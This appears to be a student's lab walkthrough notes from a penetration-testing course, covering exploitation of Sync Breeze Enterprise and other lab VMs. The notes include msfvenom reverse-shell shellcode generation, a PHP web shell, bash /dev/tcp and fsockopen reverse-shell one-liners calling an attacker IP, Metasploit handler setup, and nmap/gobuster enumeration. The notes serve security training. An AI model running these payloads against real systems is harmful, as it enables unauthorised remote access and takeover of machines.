
```
searchsploit "Sync Breeze Enterprise 10.0.28"
searchsploit -m 42341
```

install cross-compiler
```
sudo apt install mingw-w64
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32

rdesktop 192.168.204.10 -u offsec -p lab
```
- on windows search for services.msc
- click on Sync Breeze Enterprise -> Start
- open up immunity debugger as Administrator
- click file-> attach and select sync breeze
- once attached, click on view -> executable modules

create a payload with the exploit targteted at x86 and formatted for c code
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.4 LPORT=443 EXITFUNC=thread -f c â€“e x86/shikata_ga_nai -b "\x00\x0a\x0d\x25\x26\x2b\x3d
```

paste the above into the exploit, but keep the NOP slide part
compile again
```
i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
sudo wine syncbreeze_exploit.exe
sudo dpkg --add-architecture i386 && sudo apt-get update &&
sudo apt-get install wine32
```

### VM 1
```
ssh root@192.168.204.45
searchsploit -m 44976
curl -k https://192.168.204.45/uploads/shell.php?cmd=whoami
```
in python scripts need to escape quotes inside quotes of same type
```
"<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/192.168.45.194/4444 0>&1'\");?>"
```
possible alternatives that don't quite work
```
<?php $sock=fsockopen("192.168.45.194",4444);exec("/bin/sh -i <&3 >&3 2>&3"); ?>
$sock=fsockopen("192.168.45.194",4444);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
```

### VM 4
```
nmap -sT 192.168.187.213
sudo nmap -sT -A -p 20000 192.168.187.213
whatweb 192.168.187.213:20000

searchsploit -m 50999
python2 50999.py 192.168.187.213 20000

>ms6
use exploit/multi/handler
set lhost 192.168.45.194
set lport 4444
set payload windows/metrepeter/reverse_tcp
run
```

first one works
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.194 LPORT=443 -f python -b "\x00\x20" -v shellcode
msfvenom -p windows/meterpreter/reverse_tcp shikata_ga_nai LHOST=192.168.45.194 LPORT=4444 -f python -b "\x00\x20" -v shellcode
```

### VM 3
Hint
1) We recommend using /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt wordlist. Give it some time as the directory you are looking for might be at the bottom of the list.
2) Once you've found the application base address through directory fuzzing, use the exploit to point to the correct application URL.
3) In order to adjust the exploit, we suggest looking for sample files available in your local kali and rename it looking at the exploit code.
Command: 
4) Make sure you are running the exploit with the correct python version. (python2/python3)

```
nmap -sT 192.168.187.46
sudo nmap -sT -A -p 80 192.168.187.46
whatweb 192.168.187.46
gobuster dir -u http://192.168.187.46 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

```
locate sample.jpg
cp /var/lib/inetsim/http/fakefiles/sample.jpg SecSignal.jpg
```

### VM 1
```
nmap -sT 192.168.187.52
sudo nmap -sT -A -p 80 192.168.187.52
whatweb 192.168.187.52

http://192.168.187.52/cmsms
```


